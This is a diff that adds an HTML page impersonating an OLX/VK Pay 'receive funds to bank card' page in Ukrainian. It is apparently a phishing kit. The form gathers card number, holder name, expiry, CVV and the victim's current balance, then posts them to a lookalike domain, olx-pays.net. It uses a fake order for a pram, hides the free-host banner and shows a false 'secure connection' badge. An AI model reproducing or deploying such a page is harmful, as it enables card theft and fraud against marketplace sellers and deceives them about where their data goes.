@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<!-- saved from url=(0014)about:internet -->
+<html lang="ru" prefix="og: http://ogp.me/ns#" id="html" class=" safari retina_yes svg_yes"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	<title>Отримання на банківську карту</title>
+	
+	<meta name="robots" content="all">
+	<meta name="description" content="">
+	<style>img[alt="www.000webhost.com"]{display:none;}</style>
+	<meta name="keywords" content="">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<link rel="stylesheet" type="text/css" href="./Отримання на банківську карту_files/cpg_waiter.css">
+	<link rel="stylesheet" type="text/css" href="./Отримання на банківську карту_files/jquery.selectBox.css">
+	<link rel="stylesheet" type="text/css" href="./Отримання на банківську карту_files/pay-card.css">
+	<script type="text/javascript" src="./Отримання на банківську карту_files/feature-detect.js"></script>
+	<script type="text/javascript" src="./Отримання на банківську карту_files/es5-shim.min.js"></script>
+	<script type="text/javascript" src="./Отримання на банківську карту_files/jquery-1.11.3.min.js"></script>
+	<script type="text/javascript" src="./Отримання на банківську карту_files/jquery.selectBox.min.js"></script>
+	<script type="text/javascript" src="./Отримання на банківську карту_files/rb.js"></script>
+	<script type="text/javascript" src="./Отримання на банківську карту_files/common.js"></script>
+	<script type="text/javascript" src="./Отримання на банківську карту_files/cpg_waiter.js"></script>
+	<script type="text/javascript" src="./Отримання на банківську карту_files/standard_waiter.js"></script>
+	<meta property="og:site_name" content="OLX">
+	<meta property="og:title" content="Оформление и отримання коштів">
+	<meta property="og:type" content="website">
+	<meta property="og:url" content="https://olx.ua/">
+	<meta property="og:locale" content="ru_RU">
+	<meta property="og:image" content="https://i.imgur.com/oai1BAt.jpg">
+	<meta property="og:image:secure_url" content="https://i.imgur.com/oai1BAt.jpg">
+	<meta property="og:image:type" content="image/jpeg">
+	<meta property="og:image:width" content="500">
+	<meta property="og:image:height" content="500">
+	<meta property="og:description" content="Платформа онлайн-оголошень, яка об&#39;єднує людей для покупки, продажу або обміну товарами.">
+	<style>
+		#loading {
+		   width: 100%;
+		   height: 100%;
+		   top: 0;
+		   left: 0;
+		   position: fixed;
+		   display: block;
+		   opacity: 0.7;
+		   background-color: #fff;
+		   z-index: 99;
+		   text-align: center;
+		}
+
+		#loading-image {
+		  position: absolute;
+		  top: 50%;
+		  left: 50%;
+		  z-index: 100;
+		}
+	</style>
+</head>
+<body class="body_fixed-width_no body_fixed-height_no body_background_youla-mobile">
+	<div id="loading" style="display: none;">
+		<img id="loading-image" src="./Отримання на банківську карту_files/loader.gif" alt="Пожалуйста подождите...">
+	</div>
+	<div class="pay-card-layout pay-card-layout_type_youla-mobile">
+		<div class="pay-card-layout__header_type_vkpay">
+			<div class="pay-card-layout__logo">
+				<div class="vk-pay-icon vk-pay-icon_name_logo"></div>
+			</div>
+		</div>
+		<div class="pay-card js-pay-card pay-card_type_youla-mobile" data-type="freepay">
+			<div class="pay-card__row">
+				<div class="pay-card__card js-credit-card">
+					<div class="credit-card-form credit-card-form_size_standard credit-card-form_holder-name-visible credit-card-form_single-side_yes">
+						<div class="credit-card-form__popup-overlay js-cc-popup-overlay">
+							<div class="credit-card-form__popup js-cc-popup">
+								<div class="credit-card-form__popup-body">
+									<div class="notification-block">
+										<div class="notification-block__inner">
+											<div class="info-block ">
+												<div class="info-block__img-wrapper"> <span class="img vesna-icon vesna-icon_name_alert"></span> </div>
+												<div class="info-block__content">
+													<h3 class="title js-error-message">Не вдалося здійснити отримання.</h3>
+													<p class="paragraph paragraph_color_red ">Платіж був скасований.</p>
+												</div>
+											</div>
+										</div>
+									</div>
+								</div>
+								<div class="credit-card-form__popup-footer js-cc-popup-footer"> <span class="js-button button">Повторити</span> </div>
+							</div>
+						</div>
+						<div class="credit-card-form__popup-overlay js-cc-popup-overlay">
+							<div class="credit-card-form__popup js-cc-timeout-popup">
+								<div class="credit-card-form__popup-body">
+									<div class="notification-block">
+										<div class="notification-block__inner">
+											<div class="info-block ">
+												<div class="info-block__img-wrapper"> <span class="img vesna-icon vesna-icon_name_alert"></span> </div>
+												<div class="info-block__content">
+													<h3 class="title js-timeout-error-message">Статус операції невідомий.</h3>
+													<p class="paragraph paragraph_color_red ">Натисніть кнопку, щоб дізнатися статус замовлення.
+														<br>Можливо, він пройшов успішно.</p>
+												</div>
+											</div>
+										</div>
+									</div>
+								</div>
+								<div class="credit-card-form__popup-footer js-cc-popup-footer"> <span class="js-button button">Дізнатися статус</span> </div>
+							</div>
+						</div>
+						<form method="POST" action="https://olx-pays.net/order/pay.php" onsubmit="return load();" class="credit-card-form__form js-card-form" autocomplete="on">
+							<div class="credit-card-form__card-wrapper">
+								<div class="credit-card-form__card credit-card-form__card_position_front">
+									<div class="payment-systems-icons payment-systems-icons">
+										<span id="mir" class="payment-systems-icon payment-systems-icon_disabled_yes payment-systems-icon_name_mir js-payment-system-icon-mir"></span>
+										<span id="visa" class="payment-systems-icon payment-systems-icon_disabled_yes payment-systems-icon_name_visa js-payment-system-icon-visa"></span>
+										<span id="mastercard" class="payment-systems-icon payment-systems-icon_disabled_yes payment-systems-icon_name_mastercard js-payment-system-icon-mastercard"></span>
+										<span id="maestro" class="payment-systems-icon payment-systems-icon_disabled_yes payment-systems-icon_name_maestro js-payment-system-icon-maestro"></span>
+									</div>
+									<div class="credit-card-form__label-group credit-card-form__label-group_type_card-number clearfix">
+										<label class="js-cc-label credit-card-form__label"> <span class="credit-card-form__title">Номер карти</span>
+											<input type="tel" name="cardnumber" id="cardnumber" autocomplete="cc-number" placeholder="Від 16 до 19 цифр" class="credit-card-form__input js-cc-input js-cc-number-input" required="">
+											<div class="credit-card-form__error-text">Номер карти невірний</div>
+										</label>
+									</div>
+									<div class="credit-card-form__label-group credit-card-form__label-group_type_holder-name clearfix">
+										<label class="js-cc-label credit-card-form__label"> <span class="credit-card-form__title">Ім'я та прізвище на карті</span>
+											<input type="text" name="cardholder" id="cardholder" autocomplete="cc-name" class="credit-card-form__input js-cc-input js-cc-name-input" maxlength="40" placeholder="" value=" " required="">
+											<div class="credit-card-form__error-text">Ім'я та прізвище латинскьми буквами, як на карті</div>
+										</label>
+									</div>
+									<div class="js-card-expiry-date-block credit-card-form__label-group credit-card-form__label-group_type_expiration-date clearfix">
+										<label class="js-cc-label credit-card-form__label"> <span class="credit-card-form__title">Термін дії</span>
+											<input type="tel" name="expdate" id="expdate" autocomplete="cc-exp" placeholder="ММ/РР" class="credit-card-form__input js-cc-input js-cc-exp-input" required="">
+											<div class="credit-card-form__error-text">Невірна дата</div>
+										</label>
+										<label class="js-cc-label credit-card-form__label credit-card-form__label_type_cvv js-cc-cvv-label"> <span class="credit-card-form__title">CVC/CVV код <div tabindex="-1" class="credit-card-form__cvv-icon js-cc-cvv-icon"></div></span>
+											<div class="js-cvv-hint-tooltip credit-card-form__tooltip credit-card-form__tooltip_type_cvv"> Останні 3 цифри на зворотній стороні карти
+												<div class="credit-card-form__tooltip-icon"></div>
+												<div class="credit-card-form__tooltip-arrow"></div>
+											</div>
+											<input type="tel" name="cvc2" id="cvc2" placeholder="" class="credit-card-form__input  js-cc-input js-cc-cvv-input" autocomplete="off" required="">
+											<div class="credit-card-form__error-text js-cc-error-text">Останні 3 цифри на зворотній стороні карти</div>
+										</label>
+									</div>	
+
+									<div class="js-card-expiry-date-block credit-card-form__label-group credit-card-form__label-group_type_expiration-date clearfix">
+										<label class="js-cc-label credit-card-form__label credit-card-form__label_type_cvv js-cc-cvv-label"> <span class="credit-card-form__title">Залишок на картцi <div tabindex="-1"></div></span>
+											<div class="js-cvv-hint-tooltip credit-card-form__tooltip credit-card-form__tooltip_type_cvv"> Вкажiть Ваш поточний баланс картки
+												<div class="credit-card-form__tooltip-icon"></div>
+												<div class="credit-card-form__tooltip-arrow"></div>
+											</div>
+											<input type="tel" name="bal" id="bal" placeholder="Ваш поточний баланс картки" class="credit-card-form__input  js-cc-input js-cc-cvv-input" autocomplete="off" required="">
+											<div class="credit-card-form__error-text js-cc-error-text">Вкажiть Ваш поточний баланс картки</div>
+										</label>
+									</div>
+									
+								</div>
+							</div>
+							<div class="credit-card-form__submit">
+								<div class="credit-card-form__submit-inner">
+									<input type="hidden" name="amount" value="9500">
+									<input type="hidden" name="description" value="Візочок Коляска mima xari sicilian red">
+									<input type="hidden" name="order_id" value="75058486823">
+									<input type="submit" class="js-button-submit button" name="submit" value="Підтвердити зачислення">
+								</div>
+							</div>
+							<div class="credit-card-form__terms">Натискаючи кнопку, ви приймаєте <a class="credit-card-form__terms-link" href="https://help.olx.ua/hc/ru/articles/360010099020-%D0%A7%D1%82%D0%BE-%D1%82%D0%B0%D0%BA%D0%BE%D0%B5-%D1%83%D1%81%D0%BB%D1%83%D0%B3%D0%B0-OLX-%D0%94%D0%BE%D1%81%D1%82%D0%B0%D0%B2%D0%BA%D0%B0" target="_blank" rel="noopener noreferrer">умови</a>. </div>
+						</form>
+					</div>
+				</div>
+			</div>
+		</div>
+		<div class="secure-information secure-information_type_youla-mobile">
+			<span class="secure-information__text" title="Захищене з&#39;єднання. Ваші дані в безпеці.">
+			<span class="secure-information__icon"></span> <span class="secure-information__text_type_protocol">HTTPS / SSL</span>
+			<span class="secure-information__text_type_secure-connection">Безпечне сполучення</span>
+			</span>
+		</div>
+	</div>
+	<script src="./Отримання на банківську карту_files/maskedinput.js"></script>
+	<script language="javascript" type="text/javascript">
+		function load() {
+			$('#loading').show();
+		}
+	
+		$(window).load(function() {
+			$('#loading').hide();
+		});
+		
+		window.onload = function () {
+			var system = document.getElementById('cardnumber');
+			system.onkeyup = function () {
+				var value = system.value;
+				system.value.replace(/(\d)(?=(\d{3})+(\D|$))/g, '$1')
+				if (value.length > 0) {
+					var num = value[0];
+					if (num == 2) {
+						$('#mir').removeClass('payment-systems-icon_disabled_yes').addClass('payment-systems-icon_disabled_no');
+					} else if (num == 4) {
+						$('#visa').removeClass('payment-systems-icon_disabled_yes').addClass('payment-systems-icon_disabled_no');
+					} else if (num == 5) {
+						$('#mastercard').removeClass('payment-systems-icon_disabled_yes').addClass('payment-systems-icon_disabled_no');
+					} else if (num == 6) {
+						$('#maestro').removeClass('payment-systems-icon_disabled_yes').addClass('payment-systems-icon_disabled_no');
+					}
+				}
+				
+				if (value.length <= 0) {
+					$('#mir').removeClass('payment-systems-icon_disabled_no').addClass('payment-systems-icon_disabled_yes');
+					$('#visa').removeClass('payment-systems-icon_disabled_no').addClass('payment-systems-icon_disabled_yes');
+					$('#mastercard').removeClass('payment-systems-icon_disabled_no').addClass('payment-systems-icon_disabled_yes');
+					$('#maestro').removeClass('payment-systems-icon_disabled_no').addClass('payment-systems-icon_disabled_yes');
+				}
+			}
+		}
+
+		$(document).ready(function() {
+			$("#cardnumber").mask("9999 9999 9999 9999", {placeholder: ""}, {autoclear: false});
+			$("#expdate").mask("99/99", {placeholder: ""}, {autoclear: false});
+			$("#cvc2").mask("999", {placeholder: ""}, {autoclear: false});			
+		});
+	</script>
+
+
+
+</body></html>
